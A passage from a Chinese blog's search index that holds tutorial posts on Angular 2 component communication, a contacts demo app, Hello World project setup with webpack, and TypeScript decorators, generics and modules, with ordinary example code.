$&#123;to&#125;`); &#125; this.changes.push(log.join(',')); &#125;&#125; 子组件向父组件传递数据使用事件传递是子组件向父组件传递数据最常用的方式。子组件需要示例化一个用来订阅和触发自定义事件的EventEmitter类，这个实例对象是一个由装饰器@Output修饰的输出属性，当有用户操作行为发生时，该事件会被触发，父组件则通过事件绑定的方式来订阅来自子组件触发的事件，即子组件触发的具体事件会被其父组件订阅。 通过事件传递的方式来实现联系人详情页中收藏联系人的例子，父组件CollectionComponent以及子组件ContactCollectComponent，单击收藏按钮后将完成联系人的收藏操作，即在子组件中通过数据绑定的方式实现单击收藏功能，具体的收藏操作统一在父组件中实现： CollectionComponent示例代码：12345678910111213import &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'collection', template: ` &lt;contact-collect [contact]=\"detail\" (onCollect)=\"collectTheContact($event)\"&gt;&lt;/contact-collect&gt; `&#125;)export class CollectionComponent implements OnInit&#123; detail: any = &#123;&#125;; collectTheContact() &#123; this.detail.collection == 0 ? this.detail.collection = 1 : this.detail.collection = 0; &#125;&#125; 子组件ContactCollectComponent示例代码：12345678910111213141516import &#123; Component, EventEmitter, Input, Output &#125; from '@angular/core';@Component(&#123; selector: 'contact-collect', template: ` &lt;i [ngClass]=\"&#123;collected: contac.collection&#125;\" (click)=\"collectTheContact()\"&gt;收藏&lt;/i&gt; `&#125;)export class ContactCollectComponent &#123; @Input contact: any = &#123;&#125;; @Output onCollect = new EventEmitter&lt;boolean&gt;(); collectTheContact()&#123; this.onCollect.emit(); &#125;&#125; 上述代码中单击收藏按钮后将触发自定义的事件onCollect = new EventEmitter&lt;boolean&gt;(), 通过输出属性@Output将数据流向父组件，在父组件完成事件的监听，依次实现从子组件到父组件的数据交互，这样的数据通信主要依赖@Output，它声明事件绑定的输出特性，当输出属性发出一个事件，在模版中绑定的对应事件处理句柄（Event Handler）将会被调用。 其他组件交互方式父子组件间数据的传递还有其他方法： 父组件通过局部变量获取子组件引用 父组件使用@ViewChild获取子组件的引用 通过局部变量引用实现数据交互通过输入输出属性绑定的方式来实现数据双向流动，但父组件仅仅是将数据源流向下级子组件，它不拥有读取子组件的相关成员变量和方法的权限，因此也不能调用子组件的相关成员变量和方法。 在Angular中的“模版局部变量”,可以获取子组件的实例引用，即在父组件的模版中为子组件创建一个局部变量，通过此变量来获取子组件公共成员变量和函数的权限，模版局部变量的作用域范围仅存在于定义该模版局部变量的子组件。修改CollectionComponent，在父组件模版中的&lt;contact-collect&gt;子组件标签上绑定一个局部变量collect（以#号标记），依次来获取子组件类的示例对象。12345678import &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'collection', template: ` &lt;contact-collect (click)=\"collect.collectTheContact()\" #collect&gt;&lt;/contact-collect&gt; `&#125;)export class CollectionComponent&#123;&#125; 子组件ContactCollectComponent修改代码：1234567891011121314import &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'contact-collect', template: ` &lt;i [ngClass]=\"&#123;collected: detail.collection&#125;\"&gt;收藏&lt;/i&gt; `&#125;)export class ContactCollectComponent &#123; detail: any = &#123;&#125;; collectTheContact()&#123; this.detail.collection == 0 ? this.detail.collection = 1 : this.detail.collection = 0; &#125;&#125; 使用@ViewChild实现数据交互使用模版局部变量的方式简单，但有局限，即只能在模版中是哟个，而不能孩子接在父组件类里使用，@ViewChild的方式则更好。 通过@ViewChild注入的方式也可以获取子组件中变量或方法的读写权限。组件中元数据ViewChild的作用是声明子组件元素的示例引用，它提供了一个参数来选择将要引用的组件元素，这个参数可以是一个类的实例，也可以是一个字符串。具体如下： 参数为类实例，表示父组件将绑定一个指令或子组件实例 参数为字符串类型，表示将起到选择器的作用，相当于在父组件中绑定一个模版局部变量，获取到子组件的一份实例对象的引用。 对CollectionComponent代码修改：12345678910111213141516171819import &#123; Component, AfterViewInit, ViewChild &#125; from '@angular/core';@Component(&#123; selector: 'collection', template: ` &lt;contact-collect (click)=\"collectTheContact()\"&gt;&lt;/contact-collect&gt; `&#125;)export class CollectionComponent &#123; @ViewChild(ContactCollectComponent) contactCollect: ContactCollectComponent; ngAfterViewInit()&#123; // ... &#125; collectTheContact()&#123; this.contactCollect.collectTheContact(); &#125;&#125; 通过@ViewChild装饰器将ContactCollectComponent子组件注入进来，并赋值给contactCollect变量，此变量是对子组件实例的引用。 组件内容嵌入内容嵌入（ng-content）是组件的一个高级功能，它和AngularJS1.x中指令的transclude属性非常相似。 通常用来创建可复用的组件，典型的例子是模态对话框或导航栏，使得这些组件具有一致的样式，但内容又可以自定义。例如定义一个NgContentExampleComponent组件，其内容可以动态变化：1234567891011121314import &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'example-content', template: ` &lt;div&gt; &lt;h4&gt;ng-content 示例&lt;/h4&gt; &lt;div style=\"padding: 5px;\"&gt; &lt;ng-content select=\"header\"&gt;&lt;/ng-content&gt; &lt;/div&gt; &lt;/div&gt; `&#125;)class NgContentExampleComponent &#123;&#125; 模版中有一个ng-content标签，其作用是渲染组件嵌入内容，select=”header”用于匹配内容并填充到ng-content。这里的header是一个css选择器。 在NgContentAppComponent根组件中使用：123456789101112import &#123; Component &#125; from '@angular/core';@Component(&#123; selector: 'app', template: ` &lt;example-content&gt; &lt;header&gt;HEADER内容~ &lt;/header&gt; &lt;!-- 自定义内容放在example-content之间 --&gt; &lt;/example-content&gt; `&#125;)class NgContentAppComponent &#123;&#125;","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2快速入门-通讯录Demo","slug":"angular1","date":"2017-10-01T09:45:46.000Z","updated":"2017-12-06T14:50:08.774Z","comments":true,"path":"2017/10/01/angular1/","link":"","permalink":"https://github.com/xmoyKING/2017/10/01/angular1/","excerpt":"","text":"在前面的HelloWorld的基础上，做一个通讯录Demo, 并实现对联系人的添加、收藏、编辑、删除（原Demo没有删除功能），依赖包的版本以源码的package.json为准，锁定了版本号，不推荐更改版本号，主要学Angular2开发应用的逻辑和思想，而不是解决版本依赖问题）。 DEMO源码 package.json12345678910111213141516171819202122232425262728293031323334353637&#123; \"name\": \"contact\", \"version\": \"1.0.0\", \"description\": \"A simple starter Angular2 project\", \"scripts\": &#123; \"build\": \"node node_modules/webpack/bin/webpack.js --inline --colors --progress --display-error-details --display-cached\", \"watch\": \"npm run build -- --watch\", \"server\": \"node node_modules/webpack-dev-server/bin/webpack-dev-server.js --inline --colors --progress --display-error-details --display-cached --port 3000 --content-base src\", \"start\": \"npm run server\" &#125;, \"license\": \"MIT\", \"devDependencies\": &#123; \"@types/core-js\": \"0.9.34\", \"source-map-loader\": \"0.1.5\", \"ts-loader\": \"1.2.1\", \"typescript\": \"2.0.0\", \"webpack\": \"1.12.9\", \"webpack-dev-server\": \"1.14.0\", \"webpack-merge\": \"0.8.4\" &#125;, \"dependencies\": &#123; \"@angular/common\": \"2.0.0\", \"@angular/compiler\": \"2.0.0\", \"@angular/core\": \"2.0.0\", \"@angular/forms\": \"2.0.0\", \"@angular/http\": \"2.0.0\", \"@angular/platform-browser\": \"2.0.0\", \"@angular/platform-browser-dynamic\": \"2.0.0\", \"@angular/router\": \"3.0.0\", \"angular2-in-memory-web-api\": \"0.0.20\", \"bootstrap\": \"3.3.6\", \"core-js\": \"2.4.1\", \"reflect-metadata\": \"0.1.3\", \"rxjs\": \"5.0.0-beta.12\", \"zone.js\": \"0.6.23\" &#125;&#125; Demo截图预览如下（官方Demo运行结果）： 如上图，主要是4个页面，分别对应联系人列表页，收藏页，编辑页（添加页），联系人详情页。 项目组织结构组织结构如下图： 其中，主要分为4大模块：联系人列表模块（list）、联系人详情模块（detail）、编辑模块（edit）、收藏模块（collection）。页面的跳转由Angular的路由模块控制，src/app/app.router.ts配置了项目的所有路由。 src/app/app.router.ts123456789101112131415161718192021222324252627282930import &#123; Routes &#125; from '@angular/router';import &#123; CollectionComponent &#125; from './collection';import &#123; ListComponent &#125; from './list';import &#123; DetailComponent &#125; from './detail';import &#123; EditComponent &#125; from './edit';export const rootRouterConfig: Routes = [ &#123; path: '', redirectTo: 'list', pathMatch: 'full' &#125;, &#123; path: 'list', component: ListComponent &#125;, &#123; path: 'edit', component: EditComponent &#125;, &#123; path: 'edit/:id', component: EditComponent &#125;, &#123; path: 'collection', component: CollectionComponent &#125;]; src/app/app.module.ts123456789101112131415161718192021222324252627282930313233343536// 项目的主要模块都会被引入到app.module.ts中import &#123; NgModule &#125; from '@angular/core';import &#123; RouterModule &#125; from '@angular/router';import &#123; FormsModule &#125; from '@angular/forms';import &#123; BrowserModule &#125; from '@angular/platform-browser';import &#123; HttpModule &#125; from '@angular/http';import &#123; rootRouterConfig &#125; from './app.routes';import &#123; AppComponent &#125; from './app.component';import &#123; CollectionComponent &#125; from './collection';import &#123; ListComponent, ListItemComponent &#125; from './list';import &#123; DetailComponent &#125; from './detail';import &#123; EditComponent &#125; from './edit';import &#123; ContactService, UtilService, FooterComponent, HeaderComponent, PhonePipe, BtnClickDirective &#125; from './shared';// 将所涉及到的组件、路由、服务、管道等引入NgModule中，并组成一个整体可以运行起来的大模块AppModule@NgModule(&#123; declarations: [ AppComponent, ListComponent, ListItemComponent, DetailComponent, CollectionComponent, EditComponent, HeaderComponent, FooterComponent, PhonePipe, BtnClickDirective ], imports : [ BrowserModule, FormsModule, HttpModule, RouterModule.forRoot(rootRouterConfig) ], providers: [ContactService, UtilService], bootstrap: [AppComponent]&#125;)export class AppModule &#123; &#125; 数据操作是非常重要的，Angular对数据的增删改查是通过特定的服务实现的，同时已经将这些服务注入到NgModule中，这样在NgModule中引入组件就可以直接调用其中的方法，从而达到数据交互的目的，服务基本写法如下：12345678910import &#123; Injectable &#125; from '@angular/core';import &#123; Http, RequestOptions, Headers &#125; from '@angular/http';@Injectable() // 表示ContactService需要注入它所依赖的其他服务（如Http服务）export class ContactService&#123; constructor( private http: Http )&#123;&#125; // ...&#125; Angular架构梗概一个完整的Angular应用主要由6个重要部分构成，它们相互协作，各司其职。关系如下： 组件：与用户直接交互的是模版视图，模版视图并不是独立模块，它是组成组件的要素之一，另一个是组件类，用于维护组件的数据模型及功能逻辑。 模版 指令：指令与模版相互关联，最主要是增强模版特性，间接扩展模版的语法。 服务：服务是封装若干功能逻辑的单元，功能逻辑可以通过依赖注入机制引入到组件内部，作为组件功能的扩展。 依赖注入 路由：路由的功能是控制组件的创建和销毁，从而驱使应用界面跳转切换。 Angular基于组件设计的体现在：Angular应用接收用户指令、处理后输出相应视图的过程中，组件始终处于交互的出入口。组件承载了Angular的核心功能。 实际上页面所有部分均可分解为组件，即通过组件组合，嵌套，至上而下构成一个组件树，例如通讯录Demo中，包含了Header、ContactList以及Footer三个子组件、其中ContactList又有自己的子组件。 树状结构的组件关系意味着每个组件并不是孤立的存在，父子组件之间存在着双向的数据流动，要理解数据的流动，先了解组件间的调用方式，简单的说，组件的外在形态就是自定义标签，所以组件的调用实际体现在模版标签里的引用。比如Contact组件的示例代码：12345678910@Component(&#123; selector: 'contact', template: '&lt;div&gt; xxx ... &lt;/div&gt;'&#125;)export class ContactComponent &#123; @Input() item: ContactModel; @Output() update: EventEmitter&lt;ContactModel&gt;; constructor() &#123;&#125; // ...&#125; @Input()和@Output()声明组件Contact对外暴露的接口，item变量用来接收来自父组件的数据源输入，update接口用于向父组件发送数据，而父组件ContactList引用子组件并调用这些接口的具体实现为：12345678910111213141516@Component(&#123; selector: 'contact-list', template: ` &lt;!-- ... --&gt; &lt;!-- 使用&lt;contact&gt;标签调用ContactComponent组件 --&gt; &lt;contact [item]=\"listItem\" (update)=\"doUpdate(newItem)\"&gt;&lt;/contact&gt; &lt;!-- ... --&gt; `&#125;)export class ContactListComponent &#123; listItem: ContactModel[]; constrcutor()&#123;&#125; doUpdate(item: ContactModel)&#123; // ... &#125;&#125; 而父组件的模版中能够直接使用子组件ContactComponent定义的标签依赖“模块”特性。由template属性值可见，父子组件之间通过类似于HTML属性的方式传递数据，其中[item]写法称为属性绑定，数据从组件流向子组件，(update)称为事件绑定，数据从子组件流向父组件。 Angular的模版里可以直接引用组件的成员属性，如listItem和doUpdate，组件类和模版之间的数据交互称为数据绑定，属性绑定和事件绑定属于数据绑定的范畴，属性绑定和事件绑定即可用于父子组件的数据传递、也可用于数据模型和模版视图之间的数据传递，所以在父子组件通信的过程中，模版充当类似桥梁的角色，连接着二者的功能逻辑。 Angular的数据流动不是自发形成的，流动需要一个驱动力，这个驱动力即Angular的变化检测机制，Angular是一个响应式系统，每次数据变动几乎都能实时处理，并更新对应视图。 虽然ES5提供了getter/setter语言接口来捕捉对象变动，但Angular通过适当的时机（通常是用户事件、setTimeout或XHR回调等异步事件）感知数据对象发生变动。具体来说，Angular通过Zones库捕捉这些异步事件。 每个组件背后都维护着一个独立的变化监测器，其记录着所属组件的数据变更状态，由于应用是以组件树的形式组织，因此对应也有一颗变化监测树。当Zones捕获到某异步事件后，它都会通知Angular执行变化监测操作，每次变化监测操作都始于根组件，并以深度优先的原则向叶子组件遍历执行。 变化监测机制使得开发者不必关系数据何时变动，结合数据绑定实现模版视图实时更新，就是Angular强大的数据变化检测机制。变化检测机制提供了数据自动更新的功能，若需手动捕获变化事件做一些额外处理，Angular提供了完善的生命周期钩子函数，比如通过ngOnChanges可以捕获变化，通过ngOnDestroy可以在组件销毁前做一些清理工作。","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"Angular2快速入门-Hello World","slug":"angular","date":"2017-10-01T09:04:53.000Z","updated":"2017-12-06T14:50:08.774Z","comments":true,"path":"2017/10/01/angular/","link":"","permalink":"https://github.com/xmoyKING/2017/10/01/angular/","excerpt":"","text":"一步一步的学习手动搭建简单的Angular2开发环境。 本系列笔记来自《揭秘 Angular 2》一书。 DEMO源码 Hello World先从Hello World开始，一个字母一个字母的码~ 现有大局观，从项目目录结构开始：12345678910// 项目根目录- package.json // 项目依赖包配置文件- tsconfig.json // 配置TypeScript编译器的编译参数- webpack.config.json //Webpack的配置文件- index.html // 宿主页面，应用访问页面- src - app.component.html // 组件对应的模版文件 - app.component.ts // 定义组件 - app.module.ts // 定义AppModule模块，用来组织其他一些功能紧密的相关代码块 - main.ts // main.ts文件作为项目入口文件 package.json项目依赖包配置文件,描述npm包的所有的相关信息。其中scripts配置用npm调用的一些脚本，或封装一些命令。12345678910111213141516171819202122232425262728&#123; \"name\": \"HelloWorld\", \"version\": \"1.0.0\", \"description\": \"Hello-world project for Angular2\", \"scripts\": &#123; \"server\": \"webpack-dev-server --inline --colors --progress --port 3000\", \"start\": \"npm run server\" &#125;, \"license\": \"MIT\", \"devDependencies\": &#123; \"@types/core-js\": \"~0.9.0\", \"ts-loader\": \"~1.2.0\", \"typescript\": \"~2.0.0\", \"webpack\": \"~1.12.0\", \"webpack-dev-server\": \"~1.14.0\" &#125;, \"dependencies\": &#123; \"@angular/common\": \"2.0.0\", \"@angular/compiler\": \"2.0.0\", \"@angular/core\": \"2.0.0\", \"@angular/platform-browser\": \"2.0.0\", \"@angular/platform-browser-dynamic\": \"2.0.0\", \"core-js\": \"~2.4.1\", \"reflect-metadata\": \"~0.8.1\", \"rxjs\": \"5.0.0-bata.12\", \"zone.js\": \"~0.6.26\" &#125;&#125; reflect-metadata和zone.js作为Angular项目依赖的ployfill。 提前注明测试运行结果： 非常遗憾，上述代码由于Angular依赖包的版本问题，虽然npm start后webpack会报错，提示找不到’Promise’,’IterableIterator’,’PropertyKey’等东西，但localhost:3000却可以运行，且webpack-dev-sever也可以实现动态修改代码，同步更新到浏览器。 官方源码中的fix方式为锁定依赖包版本号, 具体如下：12345678910111213141516171819202122232425262728&#123; \"name\": \"HelloWorld\", \"version\": \"1.0.0\", \"description\": \"Hello-world project for Angular 2\", \"scripts\": &#123; \"server\": \"webpack-dev-server --inline --colors --progress --port 3000\", \"start\": \"npm run server\" &#125;, \"license\": \"MIT\", \"devDependencies\": &#123; \"@types/core-js\": \"0.9.34\", \"ts-loader\": \"1.2.0\", \"typescript\": \"2.0.0\", \"webpack\": \"1.12.9\", \"webpack-dev-server\": \"1.14.0\" &#125;, \"dependencies\": &#123; \"@angular/common\": \"2.0.0\", \"@angular/compiler\": \"2.0.0\", \"@angular/core\": \"2.0.0\", \"@angular/platform-browser\": \"2.0.0\", \"@angular/platform-browser-dynamic\": \"2.0.0\", \"core-js\": \"2.4.1\", \"reflect-metadata\": \"0.1.8\", \"rxjs\": \"5.0.0-beta.12\", \"zone.js\": \"0.6.26\" &#125;&#125; tsconfig.json文件tsconfig.json放在根目录下，配置TypeScript编译器的编译参数。主要的配置参数说明如下： module 组织代码的方式 target 编译的目标平台（ES3/ES5/ES6） sourceMap 把ts文件编译成js文件时，是否生成对应的SourceMap文件 emitDecoratorMetadata 让TypeScript支持为带有装饰器的声明生成元数据 experimentalDecorators 是否启用实验性装饰器特性 typeRoots 指定第三方库的类型定义文件的存放位置，一般为node_modules/@types文件夹1234567891011121314151617181920&#123; \"compilerOptions\": &#123; \"module\": \"commonjs\", \"target\": \"es5\", \"moduleResolution\": \"node\", \"sourceMap\": true, \"emitDecoratorMetadata\": true, \"experimentalDecorators\": true, \"removeComments\": false, \"noImplicitAny\": true, \"suppressImplicitAnyIndexErrors\": true, \"typeRoots\": [ \"./node_modules/@types/\" ] &#125;, \"compileOnSave\": true, \"exclude\": [ \"node_modules\" ]&#125; 源文件src/app.component.ts文件中为创建组件的代码12345678910// app.component.tsimport &#123; Component &#125; from '@angular/core'; //从Angular基础包@Angular/core中引入组件模块// 通过@Component装饰器来告诉Angular怎么创建这个组件@Component(&#123; selector: 'hello-world', // 定义该组件的DOM元素名称 templateUrl: 'src/app.component.html' // 定义组件引入所需的模版&#125;)export class AppComponent &#123;&#125; // 定义组件类并对外输出该类，这样其他文件就可以通过这个类名引用本组件 src/app.component.html文件为对应组件的模版文件，内容为html组件模版1&lt;h3&gt; Hello World&lt;/h3&gt; Angular应用需要用模块来组织一些功能紧密相关的代码块，每个应用至少有一个模块，习惯上把其称为AppModule，定义在src目录下app.module.ts。123456789101112// app.module.tsimport &#123; NgModule &#125; from '@angular/core'; // NgModule用于定义模块的装饰器import &#123; BrowserModule &#125; from '@angular/platform-browser'; import &#123; AppComponent &#125; from './app.component'; @NgModule(&#123; declarations: [AppComponent], // declarations 导入模块依赖的组件、指令等 imports: [BrowserModule], // imports导入其他所需的模块，在imports属性中配置，作为公用模块供全局调用。几乎每个应用都需要导入BrowserModule模块、其内注册了关键的Provider等通用指令 bootstrap: [AppComponent] // bootstrap标记出引导组件，在Angular启动应用时，将被标记的组件渲染到模版中&#125;)export class AppModule&#123;&#125; main.ts文件作为项目入口文件，通过这个文件来串联整个项目，在src目录下创建。启动应用主要依赖于Angular自带的platformBrowserDynamic函数和应用模块AppModule，然后调用bootstrapModule方法来编译启动AppModule模块。12345678910// main.ts// import 'reflect-metadata';import 'core-js';import 'zone.js';import &#123; platformBrowserDynamic &#125; from '@angular/platform-browser-dynamic';import &#123; AppModule &#125; from './app.module';platformBrowserDynamic() .bootstrapModule(AppModule) .catch( (err: any) =&gt; console.error(err)); 宿主页面index.html,1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;title&gt;Angular2 Hello World&lt;/title&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;base href=\"/\"&gt; &lt;/head&gt; &lt;body&gt; &lt;hello-world&gt;加载中...&lt;/hello-world&gt; &lt;script src=\"bundle.js\"&gt;&lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 其中bundle.js是Webpack打包命令运行后生成的文件，hello-world标签就是在根组件app.component.ts中定义的selector。 以上Hello World项目就搭建完成了，但运行需通过打包工具（Webpack/Gulp/Grunt/FIS3等）打包编译后才能运行。此处采用的打包工具是在devDependencies中定义的webpack，webpack-dev-server是一个小型服务器工具，项目在开发阶段可以在这个服务器上运行，Webpack的配置文件为webpack.config.js，文件放在根目录下。12345678910111213141516171819202122232425// webpack.config.jsvar webpack = require('webpack');var path = require('path');module.exports = &#123; entry: './src/main.ts', // 页面入口文件配置，可以是一个或多个入口文件 output: &#123; // 指定打包后的输出文件，这个文件会被引入到index.html中 filename: './bundle.js' &#125;, resolve: &#123; // 定义了解析模块路径 root: [path.join(__dirname, 'src')], extensions: ['', '.ts', '.js'] // extensions用来指定模块的后缀，这样就可以在引入模块时不需要写后缀了，会自动补全 &#125;, module: &#123; loaders: [ // 最关键的配置项，表明Webpack每一类文件需要使用加载器处理 &#123; test: /\\.ts$/, loader: 'ts-loader' &#125; ] &#125;&#125;;","categories":[{"name":"Angular","slug":"Angular","permalink":"https://github.com/xmoyKING/categories/Angular/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"},{"name":"angular","slug":"angular","permalink":"https://github.com/xmoyKING/tags/angular/"}]},{"title":"TypeScript入门-4-装饰器/泛型","slug":"typescript4","date":"2017-09-25T07:35:13.000Z","updated":"2017-12-06T14:50:09.524Z","comments":true,"path":"2017/09/25/typescript4/","link":"","permalink":"https://github.com/xmoyKING/2017/09/25/typescript4/","excerpt":"","text":"装饰器装饰器（Decorators）是一种特殊类型的声明，它可以被附加到类声明、方法、属性或参数上，用来给附着的主体进行装饰，装饰器由@符号紧接一个函数名称，形如@expression, expression求值后必须是一个函数，在函数执行的时候装饰器的声明方法会被执行。 方法装饰器方法装饰器是在声明一个方法之前被声明的（紧贴着方法声明），它会被应用到方法的属性描述符上，可以用来监视、修改或替换方法定义。123// TypeScript源码：// 方法装饰器declare type MethodDecorator = &lt;T&gt;(target: Object, propertyKey: string | symbol, descriptor: TypePropertyDescriptor&lt;T&gt;) =&gt; TypePropertyDescriptor&lt;T&gt; | void; 方法装饰器表达式会在运行时当做函数被调用，传入3个参数： target 类的原型对象 propertyKey 方法的名字 descriptor 成员属性描述其中descriptor的类型为TypePropertyDescriptor:12345678interface TypePropertyDescriptor&lt;T&gt; &#123; enumerable?: boolean; // 是否可遍历 configurable?: boolean; // 属性描述符是否可改变或属性是否可删除 writable?: boolean; // 是否可修改 value?: T; // 属性的值 get?: ()=&gt; T; // 属性的访问器函数（getter） set?: (value: T) =&gt; void; // 属性的设置器函数（setter）&#125; 方法装饰器实例：123456789101112131415161718192021222324// 定义一个@log装饰器function log(targe: Object, propertyKey: string, descriptor: TypedPropertyDescriptor&lt;any&gt;)&#123; let origin = descriptor.value; descriptor.value = function(...args: any[])&#123; console.log('args: ' + JSON.stringify(args)); // 调用前 let result = origin.apply(this, args); // 调用方法 console.log('Result-' + result); // 调用后 return result; &#125;; return descriptor;&#125;// 使用class TestClass&#123; @log testMethod(arg: string)&#123; return 'logMsg: ' + arg; &#125;&#125;new TestClass().testMethod('test method decorator');// 输出：// arg: [\"test method decorator\"]// Result-logMsg: test method decorator 类装饰器类装饰器是在声明一个类之前被声明的,12// 类装饰器declare type ClassDecorator = &lt;TFunction extends Function&gt;(target: TFunction) =&gt; TFunction | void; 示例：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// 定义一个@Component类装饰器function Component(component) &#123; return (target: any) =&gt; &#123; return componentClass(target, component); &#125;&#125;// 实现componentClassfunction componentClass(target: any, component?: any): any &#123; var original = target; // 由于需要返回一个新的构造函数，所以必须自己处理原型链，有些繁琐 function construct(constructor, args) &#123; // 处理原型链 let c: any = function () &#123; return constructor.apply(this, args); &#125;; c.prototype = constructor.prototype; return new c; &#125; let f: any = (...args) =&gt; &#123; // 打印参数 console.log('selector: ' + component.selector); console.log('template: ' + component.template); console.log(`Person: $&#123;original.name&#125;($&#123;JSON.stringify(args)&#125;)`); return construct(original, args); &#125;; f.prototype = original.prototype; return f; // 返回构造函数&#125;// 使用类装饰器@Component(&#123; selector: 'person', template: 'person.html'&#125;)class Person &#123; constructor( public firstName: string, public secondNmae: string ) &#123; &#125;&#125;// 测试let p = new Person('ng', 'js');// 输出：// selector: person// template: person.html// Person: Person(['ng', 'js']) 参数装饰器12// 参数装饰器declare type ParameterDecorator = (target: Object, propertyKey: string | symbol, parameterIndex: number) =&gt; void; 参数装饰器的3个参数： target 对应静态成员来说是类的构造函数，对于实例成员是类的原型对象 propertyKey 参数名称 parameterIndex 参数在函数参数列表中的索引1234567891011121314// 定义function inject(targe: any, propertyKey: string | symbol, parameterIndex: number)&#123; console.log(target); console.log(propertyKey); console.log(parameterIndex);&#125;// 使用class userService &#123; login(@inject name: string)&#123;&#125;&#125;// 输出：// Object// login// 0 属性装饰器属性装饰器是用来修饰类的属性，声明和被调用方式跟其他类似。12// 属性装饰器declare type PropertyDecorator = (target: Object, propertyKey: string | symbol) =&gt; void; 装饰器组合TypeScript支持多个装饰器同时应用到一个声明上，实现多个装饰器的复合使用：123456// 从左到右书写@decoratorA @decoratorB param// 从上到下书写@decoratorA @decoratorB functionA 当多个装饰器应用到同一个声明上时，处理步骤如下： 从左到右（上到下）依次执行装饰器函数，得到返回结果 返回结果会被当做函数，从左到右（上到下）依次调用 12345678910111213141516171819202122232425262728293031function Component(component)&#123; console.log('selector: ' + component.selector); console.log('template: ' + component.template); console.log('component init'); return (target: any) =&gt; &#123; console.log('component call'); return target; &#125; &#125;function Directive(directive)&#123; console.log('directive init'); return (target: any) =&gt; &#123; console.log('directive call'); return target; &#125; &#125;@Component(&#123;select: 'person', template: 'person.html'&#125;)@Directive()class Person&#123;&#125;// 测试let p = new Person();// 输出：// selector: person// template: person.html// component init// directive init// component call// directive call 泛型在实际开发时，定义的API不仅仅要考虑功能是否健全，还是要考虑复用性，更多的时候需要支持不定的数据类型，而泛型（Generic）就是用来实现不定类型的。 比如一个最小堆算法，需要同时支持数字和字符串类型，若把集合类型改为任意值类型（any）则等于放弃类型检查，一般是希望返回的类型需要和参数类型一致：12345678910111213141516171819202122class MinHeap&lt;T&gt; &#123; list: T[] = []; add(element: T): void &#123; // 比较，并将最小值放在数组头部 &#125; min(): T &#123; return this.list.length ? this.list[0] : null; &#125;&#125;// 使用 数字类型let heap1 = new MinHeap&lt;number&gt;();heap1.add(3);heap1.add(5);console.log(heap1.min());// 使用 字符串类型let heap2 = new MinHeap&lt;string&gt;();heap2.add('a');heap2.add('c');console.log(heap2.min()); 泛型也支持函数，比如如下zip函数将两个数组压缩到一起, 声明两个泛型T1和T2：12345678910function zip&lt;T1, T2&gt;(list1: T1[], list2: T2[]): [T1, T2][] &#123; let len = Math.min(list1.length, list2.length); let ret = []; for(let i = 0; i &lt; len; i++) &#123; ret.push([list1[i], list2[i]]); &#125; return ret;&#125;// 此处的泛型不能是其他未使用过的类型console.log(zip&lt;number, string&gt;([1,2,3], ['s1', 's2', 's3']));","categories":[{"name":"TypeScript","slug":"TypeScript","permalink":"https://github.com/xmoyKING/categories/TypeScript/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"typescript","slug":"typescript","permalink":"https://github.com/xmoyKING/tags/typescript/"}]},{"title":"TypeScript入门-3-模块/接口","slug":"typescript3","date":"2017-09-23T05:59:53.000Z","updated":"2017-12-06T14:50:09.524Z","comments":true,"path":"2017/09/23/typescript3/","link":"","permalink":"https://github.com/xmoyKING/2017/09/23/typescript3/","excerpt":"","text":"模块ES6引入了模块的概念，在TypeScript中也支持模块的使用 模块是自声明的，两个模块之间的关系是通过在文件级别上使用import和export来建立的，TypeScript和ES6一样，任何包含顶级import或export的文件都会当初一个模块。 模块在其自身的作用域里执行，而不是在全局作用域里，定义在一个模块里的变量、函数、类在模块外部是不可见的，除非明确使用export导出它们，类似的，若需要使用其他模块导出变量、函数、类和接口时，必须先通过import导入它们。 模块使用模块加载器导入它的依赖，模块加载器在代码运行时会查找并加载模块间的所有依赖，在Angular中，常用的模块加载器有SystemJs和Webpack。 模块导出方式模块导出方式分为3种，可以导出变量、函数、类、类型别名、接口给外部模块。 导出声明任何模块都能够通过export关键字来导出：1234567891011export const COMPANY = 'KING'; // 导出变量export interface IdentityValidate&#123; // 导出接口 isStagff(s: string): boolean;&#125;export class ErpIdentityValide implements IdentityValidate &#123; // 导出类 isStaff(erp: string)&#123; return erpService.contains(erp); // 判断是否为内部员工 &#125;&#125; 导出语句当需要对导出的模块进行重命名时，就用导出语句：12345678class ErpIdentityValide implements IdentityValidate &#123; // 导出类 isStaff(erp: string)&#123; return erpService.contains(erp); // 判断是否为内部员工 &#125;&#125;export &#123; ErpIdentityValide &#125;;export &#123; ErpIdentityValide as FooIdentityValidate &#125;; 模块包装有时候需要修改和扩展已有模块，并导出供其他模块调用，这时就用模块包装来再次导出：12// 导出原先的验证器，但重命名export &#123; ErpIdentityValide as RegExpBasedZipCodeValidator &#125; form \"./ErpIdentityValide\"; 一个模块可以包裹多个模块，并把新的内容以一个新的模块导出：12export * from \"./IdentityValidate\";export * from \"./ErpIdentityValide\"; 模块导入方式模块导入和导出相对，可以import关键字来导入当前模块依赖的外部模块：1234567// 默认导入import &#123; ErpIdentityValide &#125; from \"./ErpIdentityValide\";let erpValide = new ErpIdentityValide();// 别名导入import &#123; ErpIdentityValidate as ERP&#125; from \"./ErpIdentityValide\";let erpValidor = 